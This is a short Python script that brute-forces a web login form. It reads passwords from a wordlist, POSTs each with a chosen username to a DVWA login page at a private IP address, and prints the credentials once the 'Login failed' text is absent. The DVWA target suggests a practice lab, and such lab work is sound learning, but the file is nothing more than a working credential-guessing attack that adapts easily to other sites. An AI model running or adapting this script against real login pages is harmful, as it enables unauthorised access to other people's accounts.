import requests
from termcolor import colored

def bruteforce(username,url):
    for password in passwords:
        password = password.strip()
        print(colored("Trying To Bruteforce with Password: ","red")+ password)
        data_dictionary = {"username":username,"password":password,"Login":"submit"}
        response = requests.post(url,data = data_dictionary)
        if "Login failed" in (response.content).decode('utf-8'):
            pass
        else:
            print(colored("Username -->","green")+username)
            print(colored("Password -->","green")+password)
            exit()

page_url = "http://192.168.43.252/dvwa/login.php"
username = input(colored("Enter username for specified Page: ","yellow"))

with open("common.txt","r") as passwords:
    bruteforce(username,page_url)

print(colored("password is not in the list","red"))
